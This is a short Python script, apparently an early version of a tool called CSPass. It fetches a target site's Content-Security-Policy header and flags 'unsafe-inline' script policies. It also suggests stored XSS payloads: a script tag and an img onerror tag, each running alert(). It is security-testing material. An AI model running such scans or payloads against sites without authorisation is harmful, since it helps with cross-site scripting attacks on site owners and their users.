#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Ruulian
# Date created       : None

import argparse
import datetime
import requests
import re
from bs4 import BeautifulSoup as bs
import time

def date_formatted():
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

class Colors:
    # Foreground:
    FAIL = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    ERROR = '\033[91m'

    # Formatting
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'    
    
    # End colored text
    END = '\033[0m'
    NC ='\x1b[0m' # No Color

class Scanner:

    general_payload = "alert()"
    exploits = {
        "script-src 'unsafe-inline'" : [
            f'<script>{general_payload}</script>',
            f'<img src=# onerror="{general_payload}">'
            ]
        }

    def __init__(self, target, no_colors=False, dynamic=False):
        self.no_colors = no_colors
        self.target = target
        self.dynamic = dynamic
        self.exploitable = False
        self.print()
        self.print("[<]==============================[>]")
        self.print("[<]    Python CSPass @Ruulian_   [>]")
        self.print("[<]==============================[>]")
        self.print()
        self.sess = requests.session()
        self.is_csp = self.get_csp()
        
    def print(self, message=""):
        if self.no_colors:
            message = re.sub("\x1b[\[]([0-9;]+)m", "", message)
        print(message)

    def get_csp(self):
        r = self.sess.get(self.target)
        headers = r.headers

        if 'Content-Security-Policy' in headers:
            self.csp = headers['Content-Security-Policy'].split("; ")
            return True
        else:
            return False

    def info(self, message=""):
        self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")
    
    def vuln(self, message=""):
        self.print(f"[{Colors.YELLOW}VULN{Colors.END}] {message}")

    def fail(self, message=""):
        self.print(f"[{Colors.FAIL}FAIL{Colors.END}] {message}")

    def error(self, message=""):
        self.print(f"[{Colors.ERROR}ERROR{Colors.END}] {message}")
        self.print()
        exit()

    def scan(self):
        for vuln, exploit in self.__class__.exploits.items():
            r = re.compile(vuln.replace(' ', '.+'))
            for policy in self.csp:
                if r.match(policy):
                    self.vulnerability = vuln
                    self.vuln(f"Potential vulnerability found: {policy}")
                    self.vuln(f"Potential working payload: {exploit[0]}")
                    return True
        return False


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')

    parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
    parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode (uses selenium)")

    required_args = parser.add_argument_group("Required argument")
    required_args.add_argument("-t", "--target", help="Specify the target url",  required=True)
    
    auth = parser.add_argument_group('Authentication')
    auth.add_argument("-c", "--cookie", help="Specify cookies", required=False)
    auth.add_argument("-u", "--user-agent", help="Specify User-Agent", required=False)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = parse_args()
    scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic)
    scan.info(f"Starting scan on {scan.target}")

    if scan.is_csp:
        scan.info("Content Security Policy found")
    else:
        scan.error("No Content Security Policy")

    exploitable = scan.scan()
    if exploitable and scan.dynamic:
        scan.info("Starting exploit ...")
    elif exploitable:
        scan.print("[>] Use -d/--dynamic flag to use the dynamic mode")
    else:
        scan.fail("No exploit found")